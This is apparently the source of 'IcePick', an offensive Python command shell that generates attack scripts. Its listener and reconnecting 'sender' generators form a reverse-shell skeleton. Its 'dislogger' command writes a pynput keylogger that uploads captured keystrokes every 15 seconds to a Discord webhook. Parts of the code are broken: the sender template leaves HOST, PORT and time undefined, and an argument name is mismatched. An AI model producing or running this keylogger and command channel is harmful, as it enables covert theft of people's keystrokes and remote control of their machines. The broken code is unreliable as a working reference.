import os
import cmd
import sys
import ping3
import argparse
import textwrap
from colors import *
from icepick_opt import scan
from discord_webhook import DiscordWebhook


class IcePick(cmd.Cmd):
    def __init__(self, header):
        super().__init__()
        self.intro = "Welcome to IcePick shell! Type ? to list commands."
        self.prompt = cyan + "\nIceShell: " + nc + yellow + nc
    def create_listener_file(self, ip, port):
        script = textwrap.dedent(f"""
            import socket

            HOST = '{ip}'
            PORT = {port}

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((HOST, PORT))
                s.listen(1)
                print('Listener started on {ip}:{port}')
                conn, addr = s.accept()
                print('Connected by', addr)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print('Received:', data.decode())
        """)

        listener_file = os.path.abspath("filegen/listener.py")
        with open(listener_file, "w") as file:
            file.write(script)

        return listener_file

    def create_sender_file(self, ip, port):
        script = textwrap.dedent(f"""
import socket



while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            print(f"Connected to {ip}:{port}")

            while True:
                command = s.recv(1024).decode()
                if not command:
                    break

                # Add your code here to execute the received command
                # and send the response back to the sender PC

                response = "Command executed successfully"
                s.sendall(response.encode())

        except ConnectionRefusedError:
            print(f"Connection to {ip}:{port} refused. Retrying...")
        except Exception as e:
            print("An error occurred:", str(e))


    time.sleep(5)

        """)

        sender_file = os.path.abspath("filegen/sender.py")
        with open(sender_file, "w") as file:
            file.write(script)

        return sender_file


    def do_iceshell(self, args):
        """iceshell command: Create listener or sender file."""
        try:
            parser = argparse.ArgumentParser(prog="iceshell", description="Create listener or sender file")
            parser.add_argument("-c", "--create", action="store_true", help="Create file")
            parser.add_argument("-l", "--listener", action="store_true", help="Create listener file")
            parser.add_argument("-s", "--sender", action="store_true", help="Create sender file")
            parser.add_argument("-ip", "--ip", help="IP address")
            parser.add_argument("-p", "--port", type=int, help="Port number")
            parser.add_argument("-L", "--location", action="store_true", help="Show location of files")
            parsed_args = parser.parse_args(args.split())

            if parsed_args.create:
                if parsed_args.listener:
                    if parsed_args.ip and parsed_args.port:
                        listener_file = self.create_listener_file(parsed_args.ip, parsed_args.port)
                        print(bcyan + f"Listener file created at: " + nc + byellow + listener_file + nc)
                    else:
                        print(bred + "Please provide IP address and port number for the listener file." + nc)
                elif parsed_args.sender:
                    if parsed_args.ip and parsed_args.port:
                        sender_file = self.create_sender_file(parsed_args.ip, parsed_args.port)
                        print(bcyan + f"Sender file created at: " + nc + byellow + sender_file + nc)
                    else:
                        print(bred + "Please provide IP address and port number for the sender file." + nc)
            elif parsed_args.location:
                listener_file = os.path.abspath("filegen/listener.py")
                sender_file = os.path.abspath("filegen/sender.py")

                if os.path.exists(listener_file):
                    print(bcyan + f"Location of listener file: " + nc + byellow + listener_file + nc)
                else:
                    print(bred + "Listener file does not exist." + nc)

                if os.path.exists(sender_file):
                    print(bcyan + f"Location of sender file: " + nc + byellow + sender_file + nc)
                else:
                    print(bred + "Sender file does not exist." + nc)
            else:
                parser.print_help()

        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))

    def do_ping(self, args):
        """ping command: Perform a custom ping command."""
        try:
            parser = argparse.ArgumentParser(prog="ping", description="Perform a ping command.")
            parser.add_argument("-l", "--location", required=True, help="IP:PORT to ping.")
            parsed_args = parser.parse_args(args.split())

            ip, port = parsed_args.location.split(":")
            print(f"Pinging {ip}:{port}...")

            response_time = ping3.ping(ip, timeout=2)

            if response_time is not None:
                print(f"Response time: {response_time} ms")
            else:
                print("Ping failed")
        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))

    def do_scan(self, args):
        """scan command: Scan an IP address for information."""
        try:
            parser = argparse.ArgumentParser(prog="scan", description="Scan an IP address for information.")
            parser.add_argument("-i", "--ip", required=True, help="IP address to scan.")
            parsed_args = parser.parse_args(args.split())

            ip = parsed_args.ip
            scan(ip)
        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))
            
    def create_log(self, webhook_url):
        script = textwrap.dedent(f"""
            import pynput
            from discord_webhook import DiscordWebhook
            import time

            def log_key(key):
                with open("filegen/key_log.txt", "a") as f:
                    f.write(str(key))

            log_file = pynput.keyboard.Listener(on_press=log_key)
            log_file.start()

            webhook = DiscordWebhook(url="{webhook_url}")

            while True:
                try:
                    with open("filegen/key_log.txt", "r") as f:
                        log_text = f.read().strip()
                except FileNotFoundError:
                    log_text = ""
                    with open("filegen/key_log.txt", "w") as f:
                        pass

                if log_text:
                    webhook.add_file(file=open("filegen/key_log.txt", "rb"), filename="key_log.txt")

                    response = webhook.execute()
                    status_code = response.status_code

                    if status_code == 200:
                        print("File was successfully sent to the webhook.")

                time.sleep(15)

        """).strip()

        formatted_script = textwrap.indent(script, "")

        with open("filegen/logger.py", "w") as file:
            file.write(formatted_script)

        return os.path.abspath("filegen/logger.py")

    def do_dislogger(self, args):
        """dislogger command: Create a keylogger script with Discord webhook URL."""
        try:
            parser = argparse.ArgumentParser(prog="dislogger", description="Create the logger.py file.")
            parser.add_argument("-w", "--webhook", help="Discord webhook URL.", required=False)
            parser.add_argument("-L", "--location", action="store_true", help="Print the location of the logger.py file.", required=False)
            parsed_args = parser.parse_args(args.split())

            if not parsed_args.webhook and not parsed_args.locate:
                print(bred + "Please provide a valid argument. \nUse the following for more information: " + nc + byellow + "dislogger --help" + nc)
                return

            if parsed_args.locate:
                logger_file = os.path.abspath("filegen/logger.py")
                if os.path.exists(logger_file):
                    print(bcyan + "Location: " + nc + byellow + logger_file + nc)
                else:
                    print(bred + "The logger file does not exist. Create one using: " + nc + byellow + "dislogger -w [YOUR WEBHOOK URL]" + nc)
            else:
                webhook_url = parsed_args.webhook
                logger_file = self.create_log(webhook_url)

        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))



    def do_exit(self, arg):
        """exit command: Exit IcePick shell."""
        os.system('cls' if os.name == 'nt' else 'clear')
        raise SystemExit
    
    def postcmd(self, stop, line):
        if line.strip() == "exit":
            os.system('cls')
            return True
        return stop
    def cmdloop(self, intro=None):
        while True:
            try:
                super().cmdloop(intro="")
                break
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
            except SystemExit:
                print("Exiting IcePick shell.")
                os.system('cls')
                sys.exit()
    def log_key(self, key):
        with open("key_log.txt", "a") as f:
            f.write(str(key))
from icepick import choose_option
